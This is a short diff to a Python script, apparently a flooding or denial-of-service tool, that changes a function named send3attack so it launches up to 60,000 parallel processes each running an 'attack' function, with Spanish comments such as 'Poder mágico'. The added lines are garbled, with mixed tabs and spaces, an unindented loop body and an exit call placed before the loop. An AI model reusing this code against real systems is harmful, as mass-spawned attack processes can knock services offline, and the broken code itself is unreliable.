@@ -101,7 +101,13 @@ def send3attack():
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
-    sleep(1.0)
+    sleep(2)
+	exit(1)
+    for i in range(60000): #Poder mágico
+    mp = multiprocessing.Process(target=attack)
+    mp.setDaemon = False
+    mp.start() #Magic Starts
+    sleep(3)
 	
 send3attack()
-exit(1)
+exit(0)
